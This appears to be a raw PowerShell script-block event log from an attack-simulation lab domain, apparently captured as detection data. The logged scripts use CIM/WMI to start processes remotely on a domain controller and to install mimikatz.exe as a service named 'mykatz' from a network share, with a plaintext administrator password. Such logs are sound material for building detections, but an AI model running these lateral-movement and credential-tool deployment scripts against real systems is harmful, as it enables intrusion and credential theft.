 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>b86036ea-9afa-4de1-b993-d228f546ddf0</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:37:21.503379200Z'/><EventRecordID>739993</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-6376-DE2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
$RemoteComputer = "mswin-dc01.attackrange.local"
$Credentials = Get-Credential

# Create a CIM session
$CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credentials

# Define the process you want to start
$ProcessToStart = "calc.exe"

# Invoke the Create method on the Win32_Process class to start the process
$Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

# Check the result
if ($Result.ReturnValue -eq 0) {
    Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
} else {
    Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
}

# Clean up the CIM session
Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>12c1b119-7475-436b-a4ae-b82535d03664</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:36:45.977120600Z'/><EventRecordID>739940</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-1CA0-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
$RemoteComputer = "mswin-dc01.attackrange.local"
$Credentials = Get-Credential

# Create a CIM session
$CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credentials

# Define the process you want to start
$ProcessToStart = "calc.exe"

# Invoke the Create method on the Win32_Process class to start the process
$Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

# Check the result
if ($Result.ReturnValue -eq 0) {
    Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
} else {
    Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
}

# Clean up the CIM session
Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>1407819a-1eed-4784-bde3-e83659c958cd</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:25:17.318132400Z'/><EventRecordID>739771</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-3D74-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>449fe1ad-1403-45ec-aa1f-e133217e4a82</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:25:17.318120900Z'/><EventRecordID>739765</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-3D74-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>acc26cc8-b344-451b-857c-8f5a481f1a48</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:25:17.318107800Z'/><EventRecordID>739759</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-3D74-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>17af4915-c552-4350-82a2-cf5a73dd4e8e</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:13:35.781870700Z'/><EventRecordID>739636</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-139D-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$ComputerName = 'localhost'  # adjust to your server names
$Credential   = Get-Credential         # submit a user account with proper permissions

# define the arguments you want to submit to the method
# remove values that you do not want to submit
# make sure you replace values with meaningful content before running the code
# see section "Parameters" below for a description of each argument.
$arguments = @{
    DesktopInteract = [Boolean](12345)  # replace 12345 with a meaningful value
    DisplayName     = 'mykatz'  # replace 'someText' with meaningful text
    ErrorControl    = [UInt8](1)  # replace 12345 with a meaningful value
    LoadOrderGroup  = 'someText'  # replace 'someText' with meaningful text
    LoadOrderGroupDependencies = 'someText'  # replace 'someText' with meaningful text
    Name            = 'mykatz'  # replace 'someText' with meaningful text
    PathName        = '\\10.0.1.17\c$\temp\mimikatz.exe'  # replace 'someText' with meaningful text
    ServiceDependencies = 'mykatz'  # replace 'someText' with meaningful text
    ServiceType     = [UInt8](12345)  # replace 12345 with a meaningful value
    StartMode       = 'OWN_PROCESS'  # replace 'someText' with meaningful text
    StartName       = 'administrator'  # replace 'someText' with meaningful text
    StartPassword   = 'P@ssword1'  # replace 'someText' with meaningful text
}


$session = New-CimSession -ComputerName $ComputerName -Credential $Credential

Invoke-CimMethod -ClassName Win32_Service -Namespace Root/CIMV2 -MethodName Create -Arguments $arguments -CimSession $session |
Add-Member -MemberType ScriptProperty -Name ReturnValueFriendly -Passthru -Value {
  switch ([int]$this.ReturnValue)
  {
        0        {'Success'}
        1        {'Not Supported'}
        2        {'Access Denied'}
        3        {'Dependent Services Running'}
        4        {'Invalid Service Control'}
        5        {'Service Cannot Accept Control'}
        6        {'Service Not Active'}
        7        {'Service Request Timeout'}
        8        {'Unknown Failure'}
        9        {'Path Not Found'}
        10       {'Service Already Running'}
        11       {'Service Database Locked'}
        12       {'Service Dependency Deleted'}
        13       {'Service Dependency Failure'}
        14       {'Service Disabled'}
        15       {'Service Logon Failed'}
        16       {'Service Marked For Deletion'}
        17       {'Service No Thread'}
        18       {'Status Circular Dependency'}
        19       {'Status Duplicate Name'}
        20       {'Status Invalid Name'}
        21       {'Status Invalid Parameter'}
        22       {'Status Invalid Service Account'}
        23       {'Status Service Exists'}
        24       {'Service Already Paused'}
        default  {'Unknown Error '}
    }
}


Remove-CimSession -CimSession $session</Data><Data Name='ScriptBlockId'>c03fad18-b0ed-4829-9170-a52fcf15fe5f</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:13:17.521586000Z'/><EventRecordID>739605</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-E99C-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$ComputerName = 'localhost'  # adjust to your server names
$Credential   = Get-Credential         # submit a user account with proper permissions

# define the arguments you want to submit to the method
# remove values that you do not want to submit
# make sure you replace values with meaningful content before running the code
# see section "Parameters" below for a description of each argument.
$arguments = @{
    DesktopInteract = [Boolean](12345)  # replace 12345 with a meaningful value
    DisplayName     = 'mykatz'  # replace 'someText' with meaningful text
    ErrorControl    = [UInt8](mykatz)  # replace 12345 with a meaningful value
    LoadOrderGroup  = 'someText'  # replace 'someText' with meaningful text
    LoadOrderGroupDependencies = 'someText'  # replace 'someText' with meaningful text
    Name            = 'mykatz'  # replace 'someText' with meaningful text
    PathName        = '\\10.0.1.17\c$\temp\mimikatz.exe'  # replace 'someText' with meaningful text
    ServiceDependencies = 'mykatz'  # replace 'someText' with meaningful text
    ServiceType     = [UInt8](12345)  # replace 12345 with a meaningful value
    StartMode       = 'OWN_PROCESS'  # replace 'someText' with meaningful text
    StartName       = 'administrator'  # replace 'someText' with meaningful text
    StartPassword   = 'P@ssword1'  # replace 'someText' with meaningful text
}


$session = New-CimSession -ComputerName $ComputerName -Credential $Credential

Invoke-CimMethod -ClassName Win32_Service -Namespace Root/CIMV2 -MethodName Create -Arguments $arguments -CimSession $session |
Add-Member -MemberType ScriptProperty -Name ReturnValueFriendly -Passthru -Value {
  switch ([int]$this.ReturnValue)
  {
        0        {'Success'}
        1        {'Not Supported'}
        2        {'Access Denied'}
        3        {'Dependent Services Running'}
        4        {'Invalid Service Control'}
        5        {'Service Cannot Accept Control'}
        6        {'Service Not Active'}
        7        {'Service Request Timeout'}
        8        {'Unknown Failure'}
        9        {'Path Not Found'}
        10       {'Service Already Running'}
        11       {'Service Database Locked'}
        12       {'Service Dependency Deleted'}
        13       {'Service Dependency Failure'}
        14       {'Service Disabled'}
        15       {'Service Logon Failed'}
        16       {'Service Marked For Deletion'}
        17       {'Service No Thread'}
        18       {'Status Circular Dependency'}
        19       {'Status Duplicate Name'}
        20       {'Status Invalid Name'}
        21       {'Status Invalid Parameter'}
        22       {'Status Invalid Service Account'}
        23       {'Status Service Exists'}
        24       {'Service Already Paused'}
        default  {'Unknown Error '}
    }
}


Remove-CimSession -CimSession $session</Data><Data Name='ScriptBlockId'>d55a5a08-a5c0-4312-b9bf-f7f5ca4c1769</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:11:23.976765300Z'/><EventRecordID>739572</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-8093-E02E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$ComputerName = 'localhost'  # adjust to your server names
$Credential   = Get-Credential         # submit a user account with proper permissions

# define the arguments you want to submit to the method
# remove values that you do not want to submit
# make sure you replace values with meaningful content before running the code
# see section "Parameters" below for a description of each argument.
$arguments = @{
    DesktopInteract = [Boolean](12345)  # replace 12345 with a meaningful value
    DisplayName     = 'someText'  # replace 'someText' with meaningful text
    ErrorControl    = [UInt8](12345)  # replace 12345 with a meaningful value
    LoadOrderGroup  = 'someText'  # replace 'someText' with meaningful text
    LoadOrderGroupDependencies = 'someText'  # replace 'someText' with meaningful text
    Name            = 'someText'  # replace 'someText' with meaningful text
    PathName        = 'someText'  # replace 'someText' with meaningful text
    ServiceDependencies = 'someText'  # replace 'someText' with meaningful text
    ServiceType     = [UInt8](12345)  # replace 12345 with a meaningful value
    StartMode       = 'someText'  # replace 'someText' with meaningful text
    StartName       = 'someText'  # replace 'someText' with meaningful text
    StartPassword   = 'someText'  # replace 'someText' with meaningful text
}


$session = New-CimSession -ComputerName $ComputerName -Credential $Credential

Invoke-CimMethod -ClassName Win32_Service -Namespace Root/CIMV2 -MethodName Create -Arguments $arguments -CimSession $session |
Add-Member -MemberType ScriptProperty -Name ReturnValueFriendly -Passthru -Value {
  switch ([int]$this.ReturnValue)
  {
        0        {'Success'}
        1        {'Not Supported'}
        2        {'Access Denied'}
        3        {'Dependent Services Running'}
        4        {'Invalid Service Control'}
        5        {'Service Cannot Accept Control'}
        6        {'Service Not Active'}
        7        {'Service Request Timeout'}
        8        {'Unknown Failure'}
        9        {'Path Not Found'}
        10       {'Service Already Running'}
        11       {'Service Database Locked'}
        12       {'Service Dependency Deleted'}
        13       {'Service Dependency Failure'}
        14       {'Service Disabled'}
        15       {'Service Logon Failed'}
        16       {'Service Marked For Deletion'}
        17       {'Service No Thread'}
        18       {'Status Circular Dependency'}
        19       {'Status Duplicate Name'}
        20       {'Status Invalid Name'}
        21       {'Status Invalid Parameter'}
        22       {'Status Invalid Service Account'}
        23       {'Status Service Exists'}
        24       {'Service Already Paused'}
        default  {'Unknown Error '}
    }
}


Remove-CimSession -CimSession $session</Data><Data Name='ScriptBlockId'>2ffb4069-45dd-4c49-b55e-1ad76f2c041b</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:46:04.587685400Z'/><EventRecordID>229024</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0003-2ED8-9DCB425BD901}'/><Execution ProcessID='10448' ThreadID='11176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>7fabfa72-6a11-4741-b8d2-6292cb0897a6</Data><Data Name='Path'></Data></EventData></Event>
